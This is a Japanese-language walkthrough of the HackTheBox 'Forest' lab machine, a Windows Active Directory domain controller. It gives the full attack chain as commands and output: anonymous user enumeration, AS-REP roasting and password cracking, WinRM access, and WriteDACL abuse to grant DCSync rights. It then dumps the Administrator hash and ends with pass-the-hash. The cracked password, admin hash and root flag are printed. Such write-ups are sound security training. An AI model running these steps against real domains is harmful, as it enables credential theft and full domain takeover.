+++
title = "HackTheBox - Forest Writeup"
date = "2026-04-05"
description = "AS-REP Roasting と WriteDACL を利用した Active Directory 攻略"
tags = ["HackTheBox", "CTF", "Windows", "AS-REP Roasting", "DCSync", "BloodHound", "Easy"]
categories = ["HackTheBox"]
toc = true
draft = false
+++

## Machine Info

| Field | Details |
|-------|---------|
| Machine | Forest |
| OS | Windows Server 2016 |
| IP | 10.129.95.210 |
| Difficulty | Easy |

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sV 10.129.95.210
```

```text
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  wsman

OS: Windows Server 2016 Standard 14393
Domain: htb.local
FQDN: FOREST.htb.local
```

Kerberos(88)、LDAP(389)、WinRM(5985) が開いており、Active Directory 環境と判断。

---

## User Enumeration

### LDAP 匿名列挙

```bash
ldapsearch -x -H ldap://10.129.95.210 -b "dc=htb,dc=local" sAMAccountName | grep sAMAccountName
```

```text
sAMAccountName: sebastien
sAMAccountName: santi
sAMAccountName: lucinda
sAMAccountName: andy
sAMAccountName: mark
sAMAccountName: svc-alfresco
sAMAccountName: Exchange Windows Permissions
...
```

### RPC 匿名列挙

```bash
rpcclient -U "" -N 10.129.95.210
rpcclient $> enumdomusers
```

```text
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
...
```

### ユーザーリスト作成

```bash
cat user.txt | grep -oP 'user:\[([^\]]*)' | awk -F'[' '{print $2}' > users.txt
```

```text
Administrator
Guest
krbtgt
DefaultAccount
sebastien
lucinda
svc-alfresco
andy
mark
santi
...
```

---

## Initial Access

### AS-REP Roasting

```bash
impacket-GetNPUsers htb.local/ -usersfile users.txt -dc-ip 10.129.95.210 -no-pass
```

```text
$krb5asrep$23$svc-alfresco@HTB.LOCAL:e3e7f2f19e348ba1f75386550ffc3040$e86b56f7a95e99590ced5207deed845a
f9f2ed2bf8686cbf4262eb789d6aff3056b8c67e7450c37750d6c045e2d9c83fa9c395ec6bd87884369dbbca50ea0c787
17fb0516afa2986ac8da3a5467f5f3ee7658ad2303cecca468c1f19cceb0302dd6dcd9ef0e3baefa4d7d3729bcea31eab
5e7750ce0b3707d49f77b230c6d2c8257eabd35e415e75a7cb9262112eb818bb961536ae048ca5d3ce3c54dbe10055ce6
69aec39612a09ed5393fe6c039ac0323a76cb76172565c83b7ce84839b8f9c544f21c0b72b5cea42d31ffb9f470bc18de
86711ea3b6ca7181d2ad594ff6748146be3ec8a3
```

### パスワードクラック

```bash
john hash.txt --fork=4 -w=/usr/share/wordlists/rockyou.txt
```

```text
s3rvice   ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
```

---

## Foothold

```bash
evil-winrm -i 10.129.95.210 -u svc-alfresco -p s3rvice
```

```text
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents>
```

### User Flag

```bash
type C:\Users\svc-alfresco\Desktop\user.txt
```

---

## Post Exploitation

### BloodHound によるAD解析

```bash
bloodhound-python -u svc-alfresco -p s3rvice -d htb.local -ns 10.129.95.210 -c ALL
zip forest.zip 20260405162325_*.json
```

BloodHound で以下の攻撃経路を確認:

```
svc-alfresco
  → Account Operators
    → Exchange Windows Permissions
      → WriteDACL on HTB.LOCAL
        → DCSync → Domain Admins
```

---

## Privilege Escalation

### 新規ユーザー作成

```powershell
net user hacker Password123! /add /domain
net group "Exchange Windows Permissions" hacker /add
net localgroup "Remote Management Users" hacker /add
```

### WriteDACL 悪用 → DCSync 権限付与

```powershell
Import-Module .\PowerView.ps1

$pass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('htb\hacker', $pass)

Add-DomainObjectAcl -Credential $cred `
  -TargetIdentity "DC=htb,DC=local" `
  -PrincipalIdentity hacker `
  -Rights DCSync
```

### DCSync でハッシュ取得

```bash
impacket-secretsdump 'htb.local/hacker:Password123!@10.129.95.210'
```

```text
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
```

---

## SYSTEM Shell

```bash
evil-winrm -i 10.129.95.210 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
```

```text
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

### Root Flag

```bash
type C:\Users\Administrator\Desktop\root.txt
```

```text
f4db90190ef4b9d9855fbb68192f7f6c
```

---

## Summary

匿名RPC列挙でユーザーリスト作成 → AS-REP Roasting で `svc-alfresco` のハッシュ取得 → john でパスワードクラック(`s3rvice`) → WinRM でフットホールド → BloodHound で WriteDACL 経路発見 → 新規ユーザーに DCSync 権限付与 → secretsdump で Administrator ハッシュ取得 → Pass-the-Hash で SYSTEM 奪取
